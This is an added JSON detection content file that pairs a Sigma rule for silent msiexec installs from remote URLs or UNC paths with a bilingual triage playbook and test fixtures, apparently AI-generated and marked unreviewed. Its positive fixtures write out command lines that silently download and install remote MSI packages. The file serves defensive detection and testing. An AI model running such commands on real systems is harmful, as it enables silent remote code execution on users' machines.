@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
+    "title": "Suspicious Msiexec Quiet Install From Remote Location",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_msiexec_install_remote.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.007"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó msiexec.exe en modo silencioso para instalar un paquete MSI alojado en una URL HTTP(S) o en una ruta UNC remota. Puede ser una forma de descargar y ejecutar código sin interacción del usuario.",
+      "what_it_detects": "Creación de procesos donde Image termina en \\msiexec.exe u OriginalFileName es msiexec.exe, y CommandLine incluye una opción de instalación (-i, -package, -a, -j), la opción silenciosa -q (con guion o barra) y una ubicación remota (http o \\\\). Se excluyen instalaciones temporales de OpenOffice.",
+      "why_it_matters": "Msiexec es un binario firmado de Windows que los atacantes usan para ejecución proxy (ATT&CK T1218.007) y evadir controles. La referencia de la regla describe a Raspberry Robin usando msiexec para traer payloads remotos.",
+      "triage_steps": [
+        "Revise CommandLine completo: extraiga la URL o ruta UNC, el nombre del MSI y opciones como /qn, /quiet o propiedades adicionales.",
+        "Valide el dominio o IP: reputación, antigüedad, si es un repositorio interno o de un proveedor conocido, y si usa IP directa o puertos inusuales.",
+        "Analice ParentImage y su línea de comandos: cmd.exe desde un acceso directo LNK, explorer.exe desde USB, wscript o Office son señales de alerta.",
+        "Confirme el usuario que ejecutó el proceso y si corresponde a una cuenta de despliegue de software (SCCM, Intune, GPO).",
+        "Pivotee en el mismo host +/- 15 minutos: procesos hijos de msiexec, conexiones de red, archivos creados en %TEMP% o ProgramData y nuevas tareas o claves Run.",
+        "Si obtiene el MSI, calcule su hash, verifique la firma digital y búsquelo en otros endpoints.",
+        "Busque alertas previas para el mismo host, usuario o destino remoto, incluida la regla similar relacionada."
+      ],
+      "false_positives": [
+        "Despliegues legítimos de software mediante SCCM, Intune, GPO o scripts de administración que instalan MSI desde recursos compartidos internos.",
+        "Instaladores de proveedores que descargan su MSI desde su propio sitio HTTPS en modo silencioso.",
+        "Scripts de aprovisionamiento de equipos nuevos ejecutados por TI."
+      ],
+      "response_steps": [
+        "Verifique con TI o el dueño del equipo si la instalación estaba autorizada antes de actuar.",
+        "Si es sospechosa, aísle el endpoint y bloquee el dominio, IP o recurso UNC en proxy y firewall.",
+        "Recolecte el MSI, artefactos de %TEMP% y logs de Windows Installer; desinstale el producto y elimine la persistencia identificada tras confirmarla.",
+        "Busque el mismo destino y hash en toda la flota, restablezca credenciales si hubo robo y documente los IOC."
+      ],
+      "severity_rationale": "Nivel medio porque la técnica es común en malware pero también en despliegues legítimos, por lo que requiere validación del contexto."
+    },
+    "en": {
+      "summary": "msiexec.exe ran in quiet mode to install an MSI package hosted on an HTTP(S) URL or a remote UNC path. This can be used to download and run code with no user interaction.",
+      "what_it_detects": "Process creation where Image ends with \\msiexec.exe or OriginalFileName is msiexec.exe, and CommandLine contains an install option (-i, -package, -a, -j), the quiet option -q (dash or slash), and a remote location (http or \\\\). Temporary OpenOffice installs are excluded.",
+      "why_it_matters": "Msiexec is a signed Windows binary abused for system binary proxy execution (ATT&CK T1218.007) to evade controls. The rule's reference describes Raspberry Robin using msiexec to fetch remote payloads.",
+      "triage_steps": [
+        "Review the full CommandLine: extract the URL or UNC path, MSI name and switches such as /qn, /quiet or extra properties.",
+        "Assess the domain or IP: reputation, age, whether it is an internal or known vendor repository, raw IPs or unusual ports.",
+        "Check ParentImage and its command line: cmd.exe from a LNK shortcut, explorer.exe from USB, wscript or Office are red flags.",
+        "Confirm the executing user and whether it is a software deployment account (SCCM, Intune, GPO).",
+        "Pivot on the same host +/- 15 minutes: msiexec child processes, network connections, files in %TEMP% or ProgramData, new scheduled tasks or Run keys.",
+        "If you can obtain the MSI, hash it, check its digital signature and search for it on other endpoints.",
+        "Look for earlier alerts for the same host, user or remote destination, including the related similar rule."
+      ],
+      "false_positives": [
+        "Legitimate software deployment via SCCM, Intune, GPO or admin scripts installing MSIs from internal shares.",
+        "Vendor installers that silently fetch their MSI from their own HTTPS site.",
+        "IT provisioning scripts on newly built machines."
+      ],
+      "response_steps": [
+        "Confirm with IT or the machine owner whether the install was authorized before acting.",
+        "If suspicious, isolate the endpoint and block the domain, IP or UNC share at proxy and firewall.",
+        "Collect the MSI, %TEMP% artifacts and Windows Installer logs; uninstall the product and remove confirmed persistence.",
+        "Hunt for the same destination and hash fleet-wide, reset credentials if theft is suspected, and record IOCs."
+      ],
+      "severity_rationale": "Medium because the technique is common in malware but also in legitimate deployments, so context must be validated."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Quiet msiexec install from a raw-IP HTTP URL launched by cmd.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\msiexec.exe",
+          "OriginalFileName": "msiexec.exe",
+          "CommandLine": "msiexec.exe /q /i http://203.0.113.10/files/update.msi",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start msiexec.exe /q /i http://203.0.113.10/files/update.msi"
+        }
+      },
+      {
+        "description": "Renamed msiexec (OriginalFileName match) using /package and /quiet with an HTTPS URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\inst.exe",
+          "OriginalFileName": "msiexec.exe",
+          "CommandLine": "inst.exe /package https://cdn.example.org/a/setup.msi /quiet",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Quiet msiexec install of a local MSI, no remote location",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\msiexec.exe",
+          "OriginalFileName": "msiexec.exe",
+          "CommandLine": "msiexec.exe /i C:\\Deploy\\agent-7.2.msi /qn",
+          "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe"
+        }
+      },
+      {
+        "description": "Interactive (non-quiet) msiexec install from an HTTPS URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\msiexec.exe",
+          "OriginalFileName": "msiexec.exe",
+          "CommandLine": "msiexec.exe /i https://downloads.example.com/viewer.msi",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
